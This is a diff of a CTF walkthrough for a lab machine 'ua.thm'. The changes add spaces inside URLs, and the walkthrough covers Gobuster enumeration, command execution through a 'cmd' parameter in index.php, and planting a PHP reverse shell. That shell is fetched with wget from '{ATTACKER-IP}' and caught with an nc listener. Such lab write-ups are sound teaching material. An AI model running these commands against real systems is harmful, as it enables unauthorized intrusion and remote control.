@@ -4,6 +4,8 @@
 ## Intro
 Welcome to my walkthrough! This room is one of the most enjoyable CTFs I've completed so far. Let's get started!
 
+**Note**: Due to the limitations imposed by MD files, I had to include some odd spacings at times to avoid accidental links. If you see a situation that looks like this: "http:// ua.thm", assume that the space would not be there in the actual command/url and was only included in the writeup for formatting purposes.
+
 ## Setup
 First, deploy the target machine and connect via AttackBox or OpenVPN. I prefer OpenVPN, as it allows me to have my own familiar workspace and no time limit.
 
@@ -37,7 +39,7 @@ If you are fairly familiar with CTFs, feel free to skip this section of the writ
 ## Directory search
 I initially wasted a few minutes manually enumerating the web page through Firefox, and I even attempted XSS (if you don't know what that is, don't worry -- you won't need it for this room).
 Since this didn't work, I decided to make things easier for myself by letting Gobuster do some work for me:
-`gobuster dir -u http://ua.thm -w /usr/share/wordlists/dirb/common.txt`
+`gobuster dir -u http:// ua.thm -w /usr/share/wordlists/dirb/common.txt`
 
 Results:
 ```
@@ -72,24 +74,24 @@ The directory **/assets** is the most intriguing part of these results.
 ## Directory search explained
 If you are familiar with Gobuster, feel free to skip this part of the walkthrough. For those who are new to this, here are the concepts:
 
-A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http://example.com which serves as a shop. It might have a directory called http://example.com/login, and this would serve as a login page. Similarly, http://example.com/search might allow a user to search for specific items.
+A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http:// example.com which serves as a shop. It might have a directory called http:// example.com/login, and this would serve as a login page. Similarly, http:// example.com/search might allow a user to search for specific items.
 
 Gobuster takes a wordlist (in this case, a list of common directory names) and searches a website for them. Here is the breakdown of the command we used:
 
 **gobuster dir**: This tells our machine that we are using the gobuster command to find directories. Gobuster has other functions which are beyond the scope of this room.
 
-**-u http://ua.thm**: The -u flag designates the website Gobuster is scanning.
+**-u http:// ua.thm**: The -u flag designates the website Gobuster is scanning.
 
 **-w /usr/share/wordlists/dirb/common.txt**: The -w flag designates the path to a wordlist. This is essentially telling gobuster what directories to look for.
 
 Now to explain the results:
 A status code of 400 or greater means that we cannot access the directory. As a result, we only need to look at /index.html and /assets.
 
-Going to Firefox and searching http://ua.thm/index.html gave me the normal web page which seems not to contain anything of value. As a result, we will scan /assets for directories.
+Going to Firefox and searching http:// ua.thm/index.html gave me the normal web page which seems not to contain anything of value. As a result, we will scan /assets for directories.
 
 ## Directory search (/assets)
-Going to Firefox and typing **http://ua.thm/assets** yields a blank page. However, I decided to search for directories within **/assets**:
-`gobuster dir -u http://ua.thm/assets -w /usr/share/wordlists/dirb/common.txt`
+Going to Firefox and typing **http:// ua.thm/assets** yields a blank page. However, I decided to search for directories within **/assets**:
+`gobuster dir -u http:// ua.thm/assets -w /usr/share/wordlists/dirb/common.txt`
 
 This produced the following results:
 ```
@@ -118,15 +120,15 @@ Finished
 ===============================================================
 ```
 
-I tried using Firefox to visit http://ua.thm/assets/images, but I was denied access. We will now focus our efforts on index.php.
+I tried using Firefox to visit http:// ua.thm/assets/images, but I was denied access. We will now focus our efforts on index.php.
 
 ## Directory search (/assets) explained
-As expected, you can skip this section if you understand the purpose of Gobuster. For anyone who is still learning about Gobuster, this scan follows the same logic as the previous one; however, we are scanning **http://ua.thm/assets** rather than **http://ua.thm**. As usual, we ignored the status codes greater than 400.
+As expected, you can skip this section if you understand the purpose of Gobuster. For anyone who is still learning about Gobuster, this scan follows the same logic as the previous one; however, we are scanning **http:// ua.thm/assets** rather than **http:// ua.thm**. As usual, we ignored the status codes greater than 400.
 
 ## index.php and remote command execution
-Use Firefox to navigate to **http://ua.thm/assets/index.php**. I had two reasons for this: I couldn't think of any other attack paths, and I have often seen CTFs where php files are used to gain access.
+Use Firefox to navigate to **http:// ua.thm/assets/index.php**. I had two reasons for this: I couldn't think of any other attack paths, and I have often seen CTFs where php files are used to gain access.
 
-Admittedly, this section of the writeup is mostly a lucky guess; I was genuinely shocked when it worked! In my Firefox address bar, I typed **http://ua.thm/assets/index.php?cmd=whoami**. This attempt was inspired by the "Glitch" TryHackMe room, which is among the most difficult rooms to still have an "Easy" rating.
+Admittedly, this section of the writeup is mostly a lucky guess; I was genuinely shocked when it worked! In my Firefox address bar, I typed **http:// ua.thm/assets/index.php?cmd=whoami**. This attempt was inspired by the "Glitch" TryHackMe room, which is among the most difficult rooms to still have an "Easy" rating.
 
 The result was some encoded text: **d3d3LWRhdGEK**. I took this as a good sign since no error message appeared.
 
@@ -157,11 +159,11 @@ On your attacker machine, make sure you are in the same directory as your revers
 
 In the same directory, use `python3 -m http.server 80` so that your shell can be accessed through HTTP.
 
-Now, return to Firefox. You should still be viewing **http://ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our php file onto the target machine.
+Now, return to Firefox. You should still be viewing **http:// ua.thm/assets/index.php?cmd=whoami**. Replace this with **http://  ua.thm/assets/index.php?cmd=wget http:// {ATTACKER-IP}/php-reverse-shell.php.** (Note that ATTACKER-IP should be replaced with the IP of your attacker machine.) In essence, we just used our remote command execution to download our php file onto the target machine.
 
 On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `nc -nvlp 1234` to create a listener for your reverse shell.
 
-Return to Firefox and open a new tab. Enter **http://ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.
+Return to Firefox and open a new tab. Enter **http:// ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.
 
 Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user www-data!
 
@@ -172,7 +174,7 @@ Let's start by accepting that we don't need to understand how our PHP script wor
 
 `python3 -m http.server 80`: This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.
 
-**http://ua.thm/assets/index.php?cmd=wget http://{ATTACKER-IP}/php-reverse-shell.php**: Now that we've offered the script to the victim, this URL causes the victim to accept and download that script. Breaking this down, `wget` is a command to download something from a remote location, **{ATTACKER-IP}** specifies where the download comes from, and **php-reverse-shell.php** specifies what file is being downloaded. Now, our script should be present in the **/assets** directory of the victim machine.
+**http:// ua.thm/assets/index.php?cmd=wget http:// {ATTACKER-IP}/php-reverse-shell.php**: Now that we've offered the script to the victim, this URL causes the victim to accept and download that script. Breaking this down, `wget` is a command to download something from a remote location, **{ATTACKER-IP}** specifies where the download comes from, and **php-reverse-shell.php** specifies what file is being downloaded. Now, our script should be present in the **/assets** directory of the victim machine.
 
 **Troubleshooting:** If the file was not successfully downloaded to the victim machine, please ensure that a) the filename is correct and b) you started your server in the same directory as the file.
 
